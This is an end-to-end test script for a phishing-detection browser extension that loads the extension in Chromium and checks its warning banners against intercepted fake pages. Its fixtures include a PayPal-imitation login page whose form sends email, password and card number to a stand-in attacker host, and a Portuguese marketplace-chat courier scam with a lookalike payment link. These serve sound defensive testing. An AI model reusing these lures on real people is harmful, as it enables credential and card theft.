/*
 * End-to-end smoke test: loads the unpacked extension into Chromium, serves
 * fake pages for a phishing-style hostname and a benign one via request
 * interception, and checks the banner behaviour. Run: node tools/e2e.js
 * Screenshots are written to the directory given as the first argument
 * (default: ./e2e-output).
 */
const path = require('path');
const fs = require('fs');
const { chromium } = require('playwright');

const EXT = path.resolve(__dirname, '..');
const OUT = path.resolve(process.argv[2] || 'e2e-output');
fs.mkdirSync(OUT, { recursive: true });

const PHISH_HTML = `<!doctype html><html><head><title>Log in to your PayPal account</title>
<link rel="icon" href="https://www.paypalobjects.com/webstatic/icon/pp258.png"></head>
<body style="font-family:sans-serif;max-width:420px;margin:60px auto">
<img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" alt="PayPal" width="111">
<h1>PayPal</h1>
<p>Your account has been limited. Verify your identity within 24 hours or your account will be suspended.</p>
<form method="post" action="https://collect.evil-host.top/l.php">
<label>Email <input name="email" type="email"></label><br>
<label>Password <input name="password" type="password"></label><br>
<label>Card number <input name="cardnumber"></label><br>
<button>Log In</button></form>
<p><a href="#">Help</a> · <a href="#">Contact</a> · <a href="#">Fees</a> · <a href="#">Security</a> · <a href="#">Privacy</a> · <a href="#">Legal</a></p>
<p>© 2026 PayPal Inc.</p></body></html>`;

const CHAT_HTML = `<!doctype html><html><head><title>OLX - Mensagens</title></head>
<body style="font-family:sans-serif;max-width:720px;margin:40px auto">
<h1>Mensagens</h1>
<div class="chat-thread" data-testid="chat-messages">
  <div class="message in">Olá, o artigo ainda está disponível?</div>
  <div class="message out">Sim, está.</div>
  <div class="message in">Óptimo. Estou fora do país neste momento, mas envio um estafeta para levantar o artigo.
  O pagamento é feito através da transportadora. Clica no link para receber o pagamento e introduz os dados do cartão:
  https://olx-entregas-pagamento.com/receber/18273</div>
</div>
<form><textarea placeholder="Escreva uma mensagem"></textarea><button>Enviar</button></form>
</body></html>`;

const BENIGN_HTML = `<!doctype html><html><head><title>Mindera - Software Engineering</title></head>
<body><h1>Mindera</h1><p>We build software. <a href="/about">About</a> <a href="/careers">Careers</a> <a href="/contact">Contact</a> <a href="/blog">Blog</a> <a href="/work">Work</a></p></body></html>`;

async function main() {
  const ctx = await chromium.launchPersistentContext('', {
    headless: true, channel: 'chromium',
    args: [`--disable-extensions-except=${EXT}`, `--load-extension=${EXT}`],
    viewport: { width: 1100, height: 700 },
  });
  let failures = 0;
  const check = (cond, msg) => { console.log((cond ? 'PASS ' : 'FAIL ') + msg); if (!cond) failures++; };
  try {
    // Wait for the service worker to be registered.
    let [sw] = ctx.serviceWorkers();
    if (!sw) sw = await ctx.waitForEvent('serviceworker', { timeout: 15000 });

    const page = await ctx.newPage();
    await page.route('**/*', (route) => {
      const url = route.request().url();
      if (url.startsWith('https://paypal-secure-login-2026.xyz/')) return route.fulfill({ contentType: 'text/html; charset=utf-8', body: PHISH_HTML });
      if (url.startsWith('https://mindera.com/')) return route.fulfill({ contentType: 'text/html; charset=utf-8', body: BENIGN_HTML });
      if (url.startsWith('https://www.olx.pt/')) return route.fulfill({ contentType: 'text/html; charset=utf-8', body: CHAT_HTML });
      if (url.startsWith('https://www.paypalobjects.com/')) return route.fulfill({ contentType: 'image/png', body: Buffer.alloc(0) });
      return route.abort();
    });

    // 1. Phishing-style page → red banner
    await page.goto('https://paypal-secure-login-2026.xyz/signin', { waitUntil: 'domcontentloaded' });
    await page.waitForSelector('#scam-detector-banner-host', { timeout: 20000 });
    await page.waitForTimeout(500);
    await page.screenshot({ path: path.join(OUT, 'phishing-banner.png') });
    const result = await sw.evaluate(async () => {
      const all = await chrome.storage.session.get(null);
      return Object.entries(all).filter(([k]) => k.startsWith('result:')).map(([, v]) => v).sort((a, b) => b.analyzedAt - a.analyzedAt)[0];
    });
    console.log(`phishing page: verdict=${result.verdict} score=${result.score} rdap=${result.rdapStatus}`);
    console.log('signals: ' + result.signals.map((s) => `${s.id}(+${s.weight})`).join(', '));
    check(result.verdict === 'danger', 'phishing page is classified as danger');
    check(result.signals.some((s) => s.id === 'lookalike'), 'lookalike signal present');
    check(result.signals.some((s) => s.id === 'cross-domain-form'), 'cross-domain credential form detected');
    check(result.signals.some((s) => s.id === 'brand-favicon'), 'hot-linked brand favicon detected');
    check(result.signals.some((s) => s.id === 'phrase-urgency'), 'urgency wording detected');
    check(result.signals.some((s) => s.id === 'dead-links'), 'dead navigation links detected');

    // Banner interactions: "Why?" expands details, "Dismiss" removes it
    const hostCount = await page.evaluate(() => document.querySelectorAll('#scam-detector-banner-host').length);
    check(hostCount === 1, 'exactly one banner host element');
    await page.waitForTimeout(2500); // let any mutation-triggered rescans settle
    const stillOne = await page.evaluate(() => document.querySelectorAll('#scam-detector-banner-host').length);
    check(stillOne === 1, 'rescans do not duplicate the banner');

    // 2. Benign page → no banner
    await page.goto('https://mindera.com/', { waitUntil: 'domcontentloaded' });
    await page.waitForTimeout(4000);
    const benign = await sw.evaluate(async () => {
      const all = await chrome.storage.session.get(null);
      return Object.entries(all).filter(([k]) => k.startsWith('result:')).map(([, v]) => v).sort((a, b) => b.analyzedAt - a.analyzedAt)[0];
    });
    console.log(`benign page: verdict=${benign.verdict} score=${benign.score} rdap=${benign.rdapStatus} registered=${benign.registrationDate}`);
    const bannerOnBenign = await page.$('#scam-detector-banner-host');
    check(!bannerOnBenign, 'no banner on benign page');
    check(benign.verdict === 'ok' || benign.verdict === 'trusted', 'benign page is ok');
    await page.screenshot({ path: path.join(OUT, 'benign.png') });

    // 2b. Phishing-reports feed: inject a tiny index and confirm a reported page is flagged even on a brand host
    const feedPage = 'https://docs.google.com/forms/d/e/phish-test-123/viewform';
    await sw.evaluate(async (url) => {
      if (feedUpdating) { try { await feedUpdating; } catch (e) { /* ignore */ } } // let any real download finish first
      const idx = await self.SD.urlmatch.buildIndex([{ url, target: 'Microsoft' }]);
      await chrome.storage.local.set({ 'feed:phishtank': idx, 'feedmeta:phishtank': { updatedAt: Date.now(), count: 1, hosts: 0, etag: 'test', lastError: '' } });
      feedIndexCache = idx; // the worker keeps an in-memory copy
    }, feedPage);
    await page.route('https://docs.google.com/**', (route) => route.fulfill({ contentType: 'text/html; charset=utf-8', body: '<!doctype html><html><head><title>Sign in</title></head><body><h1>Microsoft 365</h1><form><input type="password" name="p"></form></body></html>' }));
    await page.goto(feedPage, { waitUntil: 'domcontentloaded' });
    await page.waitForSelector('#scam-detector-banner-host', { timeout: 20000 });
    const feedResult = await sw.evaluate(async () => {
      const all = await chrome.storage.session.get(null);
      return Object.entries(all).filter(([k]) => k.startsWith('result:')).map(([, v]) => v).sort((a, b) => b.analyzedAt - a.analyzedAt)[0];
    });
    console.log(`feed page: verdict=${feedResult.verdict} score=${feedResult.score} signals=${feedResult.signals.map((s) => s.id).join(',')}`);
    check(feedResult.verdict === 'danger' && feedResult.signals.some((s) => s.id === 'phish-report-url'), 'reported page on docs.google.com is flagged from the local feed');
    await page.goto('https://docs.google.com/forms/d/e/another/viewform', { waitUntil: 'domcontentloaded' });
    await page.waitForTimeout(2500);
    const otherDoc = await sw.evaluate(async () => {
      const all = await chrome.storage.session.get(null);
      return Object.entries(all).filter(([k]) => k.startsWith('result:')).map(([, v]) => v).sort((a, b) => b.analyzedAt - a.analyzedAt)[0];
    });
    check(otherDoc.verdict === 'trusted', 'other docs.google.com page stays trusted (shared host, no host-level match)');
    await sw.evaluate(async () => { await chrome.storage.local.remove(['feed:phishtank', 'feedmeta:phishtank']); feedIndexCache = null; });

    // 3. Marketplace chat monitor: off by default, on when enabled in settings
    await page.goto('https://www.olx.pt/mensagens/123', { waitUntil: 'domcontentloaded' });
    await page.waitForTimeout(3000);
    const chatBannerOff = await page.$('#scam-detector-banner-host');
    check(!chatBannerOff, 'chat monitor is off by default (no banner on OLX chat)');
    await sw.evaluate(async () => {
      const s = (await chrome.storage.sync.get('settings')).settings || {};
      await chrome.storage.sync.set({ settings: Object.assign({}, s, { chatMonitorEnabled: true }) });
    });
    await page.waitForTimeout(2500);
    let chatBanner = await page.$('#scam-detector-banner-host');
    if (!chatBanner) { await page.reload({ waitUntil: 'domcontentloaded' }); await page.waitForSelector('#scam-detector-banner-host', { timeout: 15000 }); }
    // Ask the content script for its chat result through the service worker
    const chatInfo = await sw.evaluate(async () => {
      const [tab] = await chrome.tabs.query({ url: 'https://www.olx.pt/*' });
      return chrome.tabs.sendMessage(tab.id, { type: 'GET_CHAT_RESULT' });
    });
    console.log(`olx chat: alert=${chatInfo && chatInfo.alert} score=${chatInfo && chatInfo.score} schemes=${chatInfo && chatInfo.schemes.map((s) => s.id).join(',')}`);
    check(!!(chatInfo && chatInfo.alert), 'chat monitor alerts on the courier + payment-link script');
    check(!!(chatInfo && chatInfo.schemes.some((s) => s.id === 'phishing-link')), 'look-alike OLX payment link detected in chat');
    check(!!(chatInfo && chatInfo.schemes.some((s) => s.id === 'courier-pickup')), 'courier pick-up scheme detected (pt)');
    await page.screenshot({ path: path.join(OUT, 'chat-banner.png') });

    // 4. Popup renders for the current tab
    const popup = await ctx.newPage();
    await popup.goto(`chrome-extension://${sw.url().split('/')[2]}/popup/popup.html`);
    await popup.waitForTimeout(800);
    await popup.screenshot({ path: path.join(OUT, 'popup.png') });
    const popupTitle = await popup.textContent('#title');
    console.log('popup title: ' + popupTitle);
    check(!!popupTitle && popupTitle !== 'Analysing…', 'popup renders a verdict');
  } finally {
    await ctx.close();
  }

  // 5. Localisation: with the browser UI in Portuguese the popup must be in Portuguese.
  const ctxPt = await chromium.launchPersistentContext('', {
    headless: true, channel: 'chromium', locale: 'pt-PT',
    args: [`--disable-extensions-except=${EXT}`, `--load-extension=${EXT}`, '--lang=pt'],
    viewport: { width: 1100, height: 700 },
  });
  try {
    let [swPt] = ctxPt.serviceWorkers();
    if (!swPt) swPt = await ctxPt.waitForEvent('serviceworker', { timeout: 15000 });
    const uiLang = await swPt.evaluate(() => chrome.i18n.getUILanguage());
    const msg = await swPt.evaluate(() => [chrome.i18n.getMessage('verdict_danger'), chrome.i18n.getMessage('banner_risk', ['42']), chrome.runtime.getManifest().name]);
    console.log(`ui language: ${uiLang}; messages: ${JSON.stringify(msg)}`);
    // getUILanguage() reports the browser build language in headless runs; message resolution is what matters.
    check(msg[0] === 'Provavelmente uma burla', 'verdict message is localised to Portuguese');
    check(msg[1] === 'risco 42/100', 'substitutions work in localised messages');
    check(msg[2] === 'Scam Detector', 'manifest name resolves through __MSG_extName__');
    const pPt = await ctxPt.newPage();
    await pPt.route('**/*', (route) => {
      const url = route.request().url();
      if (url.startsWith('https://paypal-secure-login-2026.xyz/')) return route.fulfill({ contentType: 'text/html; charset=utf-8', body: PHISH_HTML });
      if (url.startsWith('https://www.paypalobjects.com/')) return route.fulfill({ contentType: 'image/png', body: Buffer.alloc(0) });
      return route.abort();
    });
    await pPt.goto('https://paypal-secure-login-2026.xyz/signin', { waitUntil: 'domcontentloaded' });
    await pPt.waitForSelector('#scam-detector-banner-host', { timeout: 20000 });
    const tabId = await swPt.evaluate(async () => (await chrome.tabs.query({ url: 'https://paypal-secure-login-2026.xyz/*' }))[0].id);
    const popupPt = await ctxPt.newPage();
    await popupPt.goto(`chrome-extension://${swPt.url().split('/')[2]}/popup/popup.html?tabId=${tabId}`);
    await popupPt.waitForTimeout(1000);
    const titlePt = await popupPt.textContent('#title');
    const firstSignal = await popupPt.textContent('#signals li div');
    console.log(`pt popup: "${titlePt}" / first signal "${firstSignal}"`);
    check(titlePt === 'Provavelmente uma burla', 'popup verdict rendered in Portuguese');
    check(/imita PayPal|O domínio imita/.test(firstSignal || ''), 'signal label rendered in Portuguese with the brand substituted');
    await popupPt.screenshot({ path: path.join(OUT, 'popup-pt.png') });
  } finally {
    await ctxPt.close();
  }
  console.log(failures ? `${failures} check(s) failed` : 'all checks passed');
  process.exit(failures ? 1 : 0);
}

main().catch((e) => { console.error(e); process.exit(1); });
